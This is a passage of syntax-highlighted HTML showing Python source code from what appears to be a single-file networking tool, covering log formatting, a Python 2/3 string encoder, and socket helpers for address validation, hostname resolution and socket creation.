    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Private Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__get_format</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; str</span>
        <span class="hljs-string">"""Return format string based on currently applied log level."""</span>
        <span class="hljs-comment"># In debug logging we add slightly more info to all formats</span>
        <span class="hljs-keyword">if</span> self.loglevel == logging.DEBUG:
            <span class="hljs-keyword">return</span> <span class="hljs-string">"%(levelname)s [%(threadName)s]: %(message)s"</span>
        <span class="hljs-comment"># In lower than debug logging we will add even more info to all log formats</span>
        <span class="hljs-keyword">if</span> self.loglevel &lt; logging.DEBUG:
            <span class="hljs-keyword">return</span> (
                <span class="hljs-string">"%(asctime)s %(levelname)s [%(threadName)s] %(lineno)d:%(funcName)s(): %(message)s"</span>
            )
        <span class="hljs-comment"># By default, we will only add basic info</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"%(levelname)s: %(message)s"</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__colorize</span>(<span
            class="hljs-params">self, level, fmt</span>):</span>
        <span class="hljs-comment"># type: (int, str) -&gt; str</span>
        <span class="hljs-string">"""Colorize a log message based on its level."""</span>
        <span class="hljs-keyword">if</span> self.color == <span class="hljs-string">"never"</span>:
            <span class="hljs-keyword">return</span> fmt

        <span class="hljs-comment"># If stderr is redirected to a file or we're running on windows, do not do colorize</span>
        <span class="hljs-keyword">if</span> self.color == <span
                            class="hljs-string">"auto"</span> <span class="hljs-keyword">and</span> (<span
                            class="hljs-keyword">not</span> self.tty <span
                            class="hljs-keyword">or</span> os.name == <span
                            class="hljs-string">"nt"</span>):
            <span class="hljs-keyword">return</span> fmt

        <span class="hljs-keyword">return</span> self.COLORS.get(level, self.COLOR_DEF) + fmt + self.COLOR_RST


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [3/11 LIBRARY CLASSES]: (3/3) StringEncoder</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StringEncoder</span>(<span
        class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""Takes care about Python 2/3 string encoding/decoding.

    This allows to parse all string/byte values internally between all
    classes or functions as strings to keep full Python 2/3 compat.
    """</span>

    CODECS = [
        <span class="hljs-string">"utf-8"</span>,
        <span class="hljs-string">"cp437"</span>,
        <span class="hljs-string">"latin-1"</span>,
    ]

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Class methods</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @classmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rstrip</span>(<span
            class="hljs-params">cls, data, search=None</span>):</span>
        <span class="hljs-comment"># type: (Union[bytes, str], Optional[str]) -&gt; Union[bytes, str]</span>
        <span class="hljs-string">"""Implementation of rstring which works on bytes or strings."""</span>
        <span class="hljs-comment"># We have a bytes object in Python3</span>
        <span class="hljs-keyword">if</span> sys.version_info &gt;= (<span
                            class="hljs-number">3</span>, <span class="hljs-number">0</span>) <span
                            class="hljs-keyword">and</span> type(data) <span
                            class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> str:
            <span class="hljs-comment"># Strip whitespace</span>
            <span class="hljs-keyword">if</span> search <span class="hljs-keyword">is</span> <span
                            class="hljs-literal">None</span>:
                <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
                    new = data
                    new = cls.rstrip(new, <span class="hljs-string">" "</span>)
                    new = cls.rstrip(new, <span class="hljs-string">"\n"</span>)
                    new = cls.rstrip(new, <span class="hljs-string">"\r"</span>)
                    new = cls.rstrip(new, <span class="hljs-string">"\t"</span>)
                    <span class="hljs-comment"># Loop until no more changes occur</span>
                    <span class="hljs-keyword">if</span> new == data:
                        <span class="hljs-keyword">return</span> new
            <span class="hljs-keyword">else</span>:
                bsearch = StringEncoder.encode(search)
                <span class="hljs-keyword">while</span> data[<span class="hljs-number">-1</span>:] == bsearch:
                    data = data[:<span class="hljs-number">-1</span>]
                <span class="hljs-keyword">return</span> data

        <span class="hljs-comment"># Use native function</span>
        <span class="hljs-keyword">if</span> search <span class="hljs-keyword">is</span> <span
                            class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span> data.rstrip()
        <span class="hljs-keyword">return</span> data.rstrip(search)  <span class="hljs-comment"># type: ignore</span>

<span class="hljs-meta">    @classmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span>(<span
            class="hljs-params">cls, data</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; bytes</span>
        <span class="hljs-string">"""Convert string into a byte type for Python3."""</span>
        <span class="hljs-keyword">if</span> sys.version_info &gt;= (<span
                            class="hljs-number">3</span>, <span class="hljs-number">0</span>):
            <span class="hljs-keyword">for</span> codec <span class="hljs-keyword">in</span> cls.CODECS:
                <span class="hljs-comment"># On the last codec, do not catch the exception and let it trigger if it fails</span>
                <span class="hljs-keyword">if</span> codec == cls.CODECS[<span class="hljs-number">-1</span>]:
                    <span class="hljs-keyword">return</span> data.encode(codec)
                <span class="hljs-keyword">try</span>:
                    <span class="hljs-keyword">return</span> data.encode(codec)
                <span class="hljs-keyword">except</span> UnicodeEncodeError:
                    <span class="hljs-keyword">pass</span>
        <span class="hljs-keyword">return</span> data  <span
                            class="hljs-comment"># type: ignore</span>

<span class="hljs-meta">    @classmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span>(<span
            class="hljs-params">cls, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; str</span>
        <span class="hljs-string">"""Convert bytes into a string type for Python3."""</span>
        <span class="hljs-keyword">if</span> sys.version_info &gt;= (<span
                            class="hljs-number">3</span>, <span class="hljs-number">0</span>):
            <span class="hljs-keyword">for</span> codec <span class="hljs-keyword">in</span> cls.CODECS:
                <span class="hljs-comment"># On the last codec, do not catch the exception and let it trigger if it fails</span>
                <span class="hljs-keyword">if</span> codec == cls.CODECS[<span class="hljs-number">-1</span>]:
                    <span class="hljs-keyword">return</span> data.decode(codec)
                <span class="hljs-keyword">try</span>:
                    <span class="hljs-keyword">return</span> data.decode(codec)
                <span class="hljs-keyword">except</span> UnicodeDecodeError:
                    <span class="hljs-keyword">pass</span>
        <span class="hljs-keyword">return</span> data  <span
                            class="hljs-comment"># type: ignore</span>


<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># ###</span>
<span class="hljs-comment"># ###   4 / 11   N E T W O R K</span>
<span class="hljs-comment"># ###</span>
<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># #################################################################################################</span>

<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [4/11 NETWORK]: (1/1) Sock</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span
        class="hljs-title">Sock</span>(<span class="hljs-params">_Singleton(<span
        class="hljs-params"><span class="hljs-string">"SingletonMeta"</span>, (<span
        class="hljs-params">object,</span>), {}</span>)</span>):</span>  <span class="hljs-comment"># type: ignore</span>
    <span class="hljs-string">"""Thread-safe singleton Socket wrapper to emulate a module within the same file."""</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        self.__log = logging.getLogger(__name__)

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Private constants</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># For Internet Protocol v4 the value consists of an integer, the least</span>
    <span class="hljs-comment"># significant 8 bits of which represent the value of the TOS octet in IP</span>
    <span class="hljs-comment"># packets sent by the socket. RFC 1349 defines the TOS values as follows:</span>
    __IP_TOS = {
        <span class="hljs-string">"mincost"</span>: <span class="hljs-number">0x02</span>,
        <span class="hljs-string">"lowcost"</span>: <span class="hljs-number">0x02</span>,
        <span class="hljs-string">"reliability"</span>: <span class="hljs-number">0x04</span>,
        <span class="hljs-string">"throughput"</span>: <span class="hljs-number">0x08</span>,
        <span class="hljs-string">"lowdelay"</span>: <span class="hljs-number">0x10</span>,
    }

    <span class="hljs-comment"># Human readable address families</span>
    __AF_HUMAN = {
        int(socket.AF_INET): <span class="hljs-string">"IPv4"</span>,
        int(socket.AF_INET6): <span class="hljs-string">"IPv6"</span>,
    }

    <span class="hljs-comment"># Human readable socket types</span>
    __ST_HUMAN = {
        int(socket.SOCK_STREAM): <span class="hljs-string">"TCP"</span>,
        int(socket.SOCK_DGRAM): <span class="hljs-string">"UDP"</span>,
    }

    <span class="hljs-comment"># https://hg.python.org/cpython/file/3.5/Modules/socketmodule.c</span>
    __SOCK_OPTS = {
        <span class="hljs-string">"Sock"</span>: [
            <span class="hljs-string">"SO_DEBUG"</span>,
            <span class="hljs-string">"SO_ACCEPTCONN"</span>,
            <span class="hljs-string">"SO_REUSEADDR"</span>,
            <span class="hljs-string">"SO_EXCLUSIVEADDRUSE"</span>,
            <span class="hljs-string">"SO_KEEPALIVE"</span>,
            <span class="hljs-string">"SO_DONTROUTE"</span>,
            <span class="hljs-string">"SO_BROADCAST"</span>,
            <span class="hljs-string">"SO_USELOOPBACK"</span>,
            <span class="hljs-string">"SO_LINGER"</span>,
            <span class="hljs-string">"SO_OOBINLINE"</span>,
            <span class="hljs-string">"SO_REUSEPORT"</span>,
            <span class="hljs-string">"SO_SNDBUF"</span>,
            <span class="hljs-string">"SO_RCVBUF"</span>,
            <span class="hljs-string">"SO_SNDLOWAT"</span>,
            <span class="hljs-string">"SO_RCVLOWAT"</span>,
            <span class="hljs-string">"SO_SNDTIMEO"</span>,
            <span class="hljs-string">"SO_RCVTIMEO"</span>,
            <span class="hljs-string">"SO_ERROR"</span>,
            <span class="hljs-string">"SO_TYPE"</span>,
            <span class="hljs-string">"SO_SETFIB"</span>,
            <span class="hljs-string">"SO_PASSCRED"</span>,
            <span class="hljs-string">"SO_PEERCRED"</span>,
            <span class="hljs-string">"LOCAL_PEERCRED"</span>,
            <span class="hljs-string">"SO_BINDTODEVICE"</span>,
            <span class="hljs-string">"SO_PRIORITY"</span>,
            <span class="hljs-string">"SO_MARK"</span>,
        ],
        <span class="hljs-string">"IPv4"</span>: [
            <span class="hljs-string">"IP_OPTIONS"</span>,
            <span class="hljs-string">"IP_HDRINCL"</span>,
            <span class="hljs-string">"IP_TOS"</span>,
            <span class="hljs-string">"IP_TTL"</span>,
            <span class="hljs-string">"IP_RECVOPTS"</span>,
            <span class="hljs-string">"IP_RECVRETOPTS"</span>,
            <span class="hljs-string">"IP_RECVDSTADDR"</span>,
            <span class="hljs-string">"IP_RETOPTS"</span>,
            <span class="hljs-string">"IP_MULTICAST_IF"</span>,
            <span class="hljs-string">"IP_MULTICAST_TTL"</span>,
            <span class="hljs-string">"IP_MULTICAST_LOOP"</span>,
            <span class="hljs-string">"IP_ADD_MEMBERSHIP"</span>,
            <span class="hljs-string">"IP_DROP_MEMBERSHIP"</span>,
            <span class="hljs-string">"IP_DEFAULT_MULTICAST_TTL"</span>,
            <span class="hljs-string">"IP_DEFAULT_MULTICAST_LOOP"</span>,
            <span class="hljs-string">"IP_MAX_MEMBERSHIPS"</span>,
            <span class="hljs-string">"IP_TRANSPARENT"</span>,
        ],
        <span class="hljs-string">"IPv6"</span>: [
            <span class="hljs-string">"IPV6_JOIN_GROUP"</span>,
            <span class="hljs-string">"IPV6_LEAVE_GROUP"</span>,
            <span class="hljs-string">"IPV6_MULTICAST_HOPS"</span>,
            <span class="hljs-string">"IPV6_MULTICAST_IF"</span>,
            <span class="hljs-string">"IPV6_MULTICAST_LOOP"</span>,
            <span class="hljs-string">"IPV6_UNICAST_HOPS"</span>,
            <span class="hljs-string">"IPV6_V6ONLY"</span>,
            <span class="hljs-string">"IPV6_CHECKSUM"</span>,
            <span class="hljs-string">"IPV6_DONTFRAG"</span>,
            <span class="hljs-string">"IPV6_DSTOPTS"</span>,
            <span class="hljs-string">"IPV6_HOPLIMIT"</span>,
            <span class="hljs-string">"IPV6_HOPOPTS"</span>,
            <span class="hljs-string">"IPV6_NEXTHOP"</span>,
            <span class="hljs-string">"IPV6_PATHMTU"</span>,
            <span class="hljs-string">"IPV6_PKTINFO"</span>,
            <span class="hljs-string">"IPV6_RECVDSTOPTS"</span>,
            <span class="hljs-string">"IPV6_RECVHOPLIMIT"</span>,
            <span class="hljs-string">"IPV6_RECVHOPOPTS"</span>,
            <span class="hljs-string">"IPV6_RECVPKTINFO"</span>,
            <span class="hljs-string">"IPV6_RECVRTHDR"</span>,
            <span class="hljs-string">"IPV6_RECVTCLASS"</span>,
            <span class="hljs-string">"IPV6_RTHDR"</span>,
            <span class="hljs-string">"IPV6_RTHDRDSTOPTS"</span>,
            <span class="hljs-string">"IPV6_RTHDR_TYPE_0"</span>,
            <span class="hljs-string">"IPV6_RECVPATHMTU"</span>,
            <span class="hljs-string">"IPV6_TCLASS"</span>,
            <span class="hljs-string">"IPV6_USE_MIN_MTU"</span>,
        ],
        <span class="hljs-string">"TCP"</span>: [
            <span class="hljs-string">"TCP_NODELAY"</span>,
            <span class="hljs-string">"TCP_MAXSEG"</span>,
            <span class="hljs-string">"TCP_CORK"</span>,
            <span class="hljs-string">"TCP_KEEPIDLE"</span>,
            <span class="hljs-string">"TCP_KEEPINTVL"</span>,
            <span class="hljs-string">"TCP_KEEPCNT"</span>,
            <span class="hljs-string">"TCP_SYNCNT"</span>,
            <span class="hljs-string">"TCP_LINGER2"</span>,
            <span class="hljs-string">"TCP_DEFER_ACCEPT"</span>,
            <span class="hljs-string">"TCP_WINDOW_CLAMP"</span>,
            <span class="hljs-string">"TCP_INFO"</span>,
            <span class="hljs-string">"TCP_QUICKACK"</span>,
            <span class="hljs-string">"TCP_FASTOPEN"</span>,
        ],
    }

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Static methods</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_ipv6_address</span>(<span
            class="hljs-params">host</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; bool</span>
        <span class="hljs-string">"""Check if a given str is a valid IPv6 address."""</span>
        <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> check for link-local addresses (start with: fe80)</span>
        <span class="hljs-comment"># https://stackoverflow.com/questions/3801701</span>

        <span class="hljs-comment"># [1/4] socket.inet_pton</span>
        <span class="hljs-keyword">if</span> hasattr(socket, <span
                            class="hljs-string">"inet_pton"</span>):
            <span class="hljs-keyword">try</span>:
                socket.inet_pton(socket.AF_INET6, host)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            <span class="hljs-keyword">except</span> socket.error:
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># [2/4] optional module: ipaddress</span>
        <span class="hljs-keyword">try</span>:
            addr = unicode(host)  <span class="hljs-comment"># type: ignore</span>
        <span class="hljs-keyword">except</span> NameError:
            addr = host
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">try</span>:
                ipaddress.IPv6Address(addr)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            <span class="hljs-keyword">except</span> ipaddress.AddressValueError:
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">except</span> NameError:
            <span class="hljs-keyword">pass</span>

        <span class="hljs-comment"># [3/4] regex</span>
        <span class="hljs-comment"># This is a poor mans solution, but we only want to know if it</span>
        <span class="hljs-comment"># is on the format of IPv6 and not if it is a valid IPv6. The</span>
        <span class="hljs-comment"># validation will be figured out during connect()</span>
        reg = <span class="hljs-string">r"^([a-f0-9]{0,4}:){5}[a-f0-9]{0,4}$"</span>
        <span class="hljs-keyword">if</span> re.match(reg, host):
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

        <span class="hljs-comment"># [4/4] Nope</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_ipv4_address</span>(<span
            class="hljs-params">host</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; bool</span>
        <span class="hljs-string">"""Check if a given str is a valid IPv4 address."""</span>
        <span class="hljs-comment"># [1/5] socket.inet_aton</span>
        <span class="hljs-keyword">if</span> hasattr(socket, <span
                            class="hljs-string">"inet_aton"</span>):
            <span class="hljs-keyword">try</span>:
                socket.inet_aton(host)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            <span class="hljs-keyword">except</span> socket.error:
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># [2/5] socket.inet_pton</span>
        <span class="hljs-keyword">if</span> hasattr(socket, <span
                            class="hljs-string">"inet_pton"</span>):
            <span class="hljs-keyword">try</span>:
                socket.inet_pton(socket.AF_INET, host)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            <span class="hljs-keyword">except</span> socket.error:
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># [3/5] optional module: ipaddress</span>
        <span class="hljs-keyword">try</span>:
            addr = unicode(host)  <span class="hljs-comment"># type: ignore</span>
        <span class="hljs-keyword">except</span> NameError:
            addr = host
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">try</span>:
                ipaddress.IPv4Address(addr)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            <span class="hljs-keyword">except</span> ipaddress.AddressValueError:
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">except</span> NameError:
            <span class="hljs-keyword">pass</span>

        <span class="hljs-comment"># [4/5] regex</span>
        <span class="hljs-comment"># This is a poor mans solution, but we only want to know if it</span>
        <span class="hljs-comment"># is on the format of IPv4 and not if it is a valid IPv4. The</span>
        <span class="hljs-comment"># validation will be figured out during connect()</span>
        reg = <span class="hljs-string">r"^([0-9]{1,3}\.){3}[0-9]{1,3}$"</span>
        <span class="hljs-keyword">if</span> re.match(reg, host):
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

        <span class="hljs-comment"># [5/5] Nope</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Get functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_iptos_by_name</span>(<span
            class="hljs-params">self, name</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; int</span>
        <span class="hljs-string">"""Get IP Type of Service hexadecimal value by name."""</span>
        <span class="hljs-keyword">assert</span> name <span class="hljs-keyword">in</span> self.__IP_TOS
        <span class="hljs-keyword">return</span> self.__IP_TOS[name]

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_family_name</span>(<span
            class="hljs-params">self, family</span>):</span>
        <span class="hljs-comment"># type: (Union[socket.AddressFamily, int]) -&gt; str</span>
        <span class="hljs-string">"""Returns human readable name of given address family as str."""</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">return</span> self.__AF_HUMAN[int(family)]
        <span class="hljs-keyword">except</span> KeyError:
            self.__log.error(
                <span class="hljs-string">"Invalid key for address family: %s (type: %s) (valid: %s)"</span>,
                repr(family),
                repr(type(family)),
                repr(self.__AF_HUMAN),
            )
            <span class="hljs-keyword">return</span> <span class="hljs-string">"unknown"</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_type_name</span>(<span
            class="hljs-params">self, sock_type</span>):</span>
        <span class="hljs-comment"># type: (int) -&gt; str</span>
        <span class="hljs-string">"""Returns human readable name of given socket type as str."""</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">return</span> self.__ST_HUMAN[int(sock_type)]
        <span class="hljs-keyword">except</span> KeyError:
            self.__log.error(
                <span class="hljs-string">"Invalid key for address sock_type: %s (type: %s) (valid: %s)"</span>,
                repr(sock_type),
                repr(type(sock_type)),
                repr(self.__ST_HUMAN),
            )
            <span class="hljs-keyword">return</span> <span class="hljs-string">"unknown"</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_sock_opts</span>(<span
            class="hljs-params">self, sock, opts</span>):</span>
        <span class="hljs-comment"># type: (Sock, socket.socket, Optional[str]) -&gt; List[str]</span>
        <span class="hljs-string">"""Debug logs configured socket options."""</span>
        <span class="hljs-keyword">if</span> opts <span class="hljs-keyword">is</span> <span
                            class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span> []
        <span class="hljs-keyword">assert</span> opts <span class="hljs-keyword">in</span> [<span
                            class="hljs-string">"all"</span>, <span
                            class="hljs-string">"sock"</span>, <span
                            class="hljs-string">"ipv4"</span>, <span
                            class="hljs-string">"ipv6"</span>, <span
                            class="hljs-string">"tcp"</span>], <span
                            class="hljs-string">"Value: {}"</span>.format(repr(opts))
        info = []
        <span class="hljs-keyword">for</span> proto, optnames <span class="hljs-keyword">in</span> self.__SOCK_OPTS.items():
            <span class="hljs-keyword">if</span> opts == <span
                            class="hljs-string">"all"</span> <span class="hljs-keyword">or</span> proto.lower() == opts:
                <span class="hljs-keyword">for</span> optname <span class="hljs-keyword">in</span> optnames:
                    <span class="hljs-keyword">if</span> proto.lower() == <span class="hljs-string">"sock"</span>:
                        level = socket.SOL_SOCKET
                    <span class="hljs-keyword">elif</span> proto.lower() == <span
                            class="hljs-string">"ipv4"</span>:
                        level = socket.IPPROTO_IP
                    <span class="hljs-keyword">elif</span> proto.lower() == <span
                            class="hljs-string">"ipv6"</span>:
                        level = socket.IPPROTO_IPV6
                    <span class="hljs-keyword">elif</span> proto.lower() == <span
                            class="hljs-string">"tcp"</span>:
                        level = socket.IPPROTO_TCP
                    <span class="hljs-keyword">try</span>:
                        info.append(
                            <span class="hljs-string">"{}: {}: {}"</span>.format(
                                proto,
                                optname,
                                sock.getsockopt(
                                    level, eval(<span class="hljs-string">"socket."</span> + optname)  <span
                            class="hljs-comment"># pylint: disable=eval-used</span>
                                ),
                            )
                        )
                    <span class="hljs-keyword">except</span> AttributeError:
                        <span class="hljs-keyword">pass</span>
                    <span class="hljs-keyword">except</span> (OSError, socket.error):
                        <span class="hljs-keyword">pass</span>
        <span class="hljs-keyword">return</span> info

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gethostbyname</span>(<span
            class="hljs-params">self, host, family, resolvedns</span>):</span>
        <span class="hljs-comment"># type: (Sock, Optional[str], Union[socket.AddressFamily, int], bool) -&gt; str</span>
        <span class="hljs-string">"""Translate hostname into a IP address for a given address family.

        Args:
            host (str): The hostname to resolvea.
            family (socket.family): IPv4 or IPv6 family

        Returns:
            str: Numeric IP address.

        Raises:
            socket.gaierror: If hostname cannot be resolved.
        """</span>
        socktype = <span class="hljs-number">0</span>
        proto = <span class="hljs-number">0</span>
        flags = <span class="hljs-number">0</span>
        port = <span class="hljs-literal">None</span>
        family = int(family)

        <span class="hljs-comment"># [1/4] Wildcard without host</span>
        <span class="hljs-keyword">if</span> host <span class="hljs-keyword">is</span> <span
                            class="hljs-literal">None</span>:
            <span class="hljs-keyword">if</span> family == int(socket.AF_INET):
                self.__log.debug(<span class="hljs-string">"Resolving IPv4 name not required, using wildcard: 0.0.0.0"</span>)
                <span class="hljs-keyword">return</span> <span class="hljs-string">"0.0.0.0"</span>
            <span class="hljs-keyword">if</span> family == int(socket.AF_INET6):
                self.__log.debug(<span class="hljs-string">"Resolving IPv6 name not required, using wildcard: ::"</span>)
                <span class="hljs-keyword">return</span> <span class="hljs-string">"::"</span>
        <span class="hljs-keyword">assert</span> host <span class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span class="hljs-literal">None</span>

        <span class="hljs-comment"># [2/4] Already an IP address</span>
        <span class="hljs-keyword">if</span> family == int(socket.AF_INET6):
            <span class="hljs-keyword">if</span> Sock.is_ipv6_address(host):
                self.__log.debug(<span class="hljs-string">"Resolving IPv6 name not required, already an IP: %s"</span>, host)
                <span class="hljs-keyword">return</span> host
            <span class="hljs-comment"># Map IPv4 address to IPv6</span>
            host6 = <span class="hljs-string">"::ffff:"</span> + host
            <span class="hljs-keyword">if</span> Sock.is_ipv6_address(host6):
                self.__log.debug(<span class="hljs-string">"Resolving IPv4 name not required, changing to IPv6: %s"</span>, host6)
                <span class="hljs-keyword">return</span> host6
        <span class="hljs-keyword">elif</span> family == int(socket.AF_INET):
            <span class="hljs-keyword">if</span> Sock.is_ipv4_address(host):
                self.__log.debug(<span class="hljs-string">"Resolving IPv4 host not required, already an IP: %s"</span>, host)
                <span class="hljs-keyword">return</span> host

        <span class="hljs-comment"># [3/4] Do we disable DNS resolution?</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resolvedns:
            flags = socket.AI_NUMERICHOST

        <span class="hljs-comment"># [4/4] Resolve</span>
        <span class="hljs-keyword">try</span>:
            infos = socket.getaddrinfo(host, port, family, socktype, proto, flags)
            addr = str(infos[<span class="hljs-number">0</span>][<span class="hljs-number">4</span>][<span
                            class="hljs-number">0</span>])
            self.__log.debug(<span class="hljs-string">"Resolved %s host: %s"</span>, self.get_family_name(family), addr)
            <span class="hljs-keyword">return</span> addr
        <span class="hljs-keyword">except</span> (AttributeError, socket.gaierror) <span
                            class="hljs-keyword">as</span> error:
            msg = <span class="hljs-string">"Resolving {} host: {} failed: {}"</span>.format(
                self.get_family_name(family), str(host), str(error)
            )
            self.__log.debug(msg)
            <span class="hljs-keyword">raise</span> socket.gaierror(msg)  <span
                            class="hljs-comment"># type: ignore</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Create functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_socket</span>(<span
            class="hljs-params">self, family, sock_type, reuse_addr, ip_tos_name=None</span>):</span>
        <span class="hljs-comment"># type: (Union[socket.AddressFamily, int], int, bool, Optional[str]) -&gt; socket.socket</span>
        <span class="hljs-string">"""Create TCP or UDP socket.

        Args:
            family (socket.family): The address family for which to create the socket for.
            sock_type (int): The socket type: socket.SOCK_DGRAM or socket.SOCK_STREAM
            reuse_addr (bool): Set SO_REUSEADDR on the socket.
            ip_tos_name (str): Optional IP type of service value to apply to socket

        Returns:
            socket.socket: Returns TCP or UDP socket for the given address family.

        Raises:
            socket.error: If socket cannot be created.
        """</span>
        <span class="hljs-keyword">assert</span> int(sock_type) <span class="hljs-keyword">in</span> [int(socket.SOCK_DGRAM), int(socket.SOCK_STREAM)]
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">if</span> int(sock_type) == int(socket.SOCK_DGRAM):
                self.__log.debug(
                    <span class="hljs-string">"Creating (family %d/%s, UDP) socket"</span>, int(family), self.get_family_name(family)
                )
                sock = socket.socket(family, socket.SOCK_DGRAM)
            <span class="hljs-keyword">else</span>:
                self.__log.debug(
                    <span class="hljs-string">"Creating (family %d/%s, TCP) socket"</span>, int(family), self.get_family_name(family)
                )
                sock = socket.socket(family, socket.SOCK_STREAM)
        <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> error:
            msg = <span class="hljs-string">"Creating (family {}/{}, {}) socket failed: {}"</span>.format(
                int(family), self.get_family_name(family), self.get_type_name(sock_type), error
            )
            self.__log.debug(msg)
            <span class="hljs-keyword">raise</span> socket.error(msg)

        <span class="hljs-keyword">if</span> family == socket.AF_INET6:
            <span class="hljs-comment"># On Linux, IPv6 sockets accept IPv4 too by default, but this makes</span>
            <span class="hljs-comment"># it impossible to bind to both 0.0.0.0 in IPv4 and :: in IPv6.</span>
            <span class="hljs-comment"># On other systems, separate sockets *must* be used to listen for</span>
            <span class="hljs-comment"># both IPv4 and IPv6. For consistency, always disable IPv4 on our</span>
            <span class="hljs-comment"># IPv6 sockets and use a separate ipv4 socket when needed.</span>
            <span class="hljs-comment">#</span>
            <span class="hljs-comment"># Python 2.x on windows doesn't have IPPROTO_IPV6.</span>
            <span class="hljs-keyword">if</span> hasattr(socket, <span class="hljs-string">"IPPROTO_IPV6"</span>):
                self.__log.debug(
                    <span class="hljs-string">"Disabling IPv4 support on %s socket"</span>, self.get_family_name(family)
                )
                sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, <span
                            class="hljs-number">1</span>)

        <span class="hljs-comment"># Get around the "[Errno 98] Address already in use" error, if the socket is still in wait</span>
        <span class="hljs-comment"># we instruct it to reuse the address anyway.</span>
        <span class="hljs-keyword">if</span> reuse_addr:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span
                            class="hljs-number">1</span>)

        <span class="hljs-comment"># If requested, set IP Type of Service value for current socket</span>
        <span class="hljs-keyword">if</span> ip_tos_name <span class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
            ip_tos_val = self.get_iptos_by_name(ip_tos_name)
            self.__log.debug(<span class="hljs-string">"Setting IP_TOS to: %d (%s)"</span>, ip_tos_val, ip_tos_name)
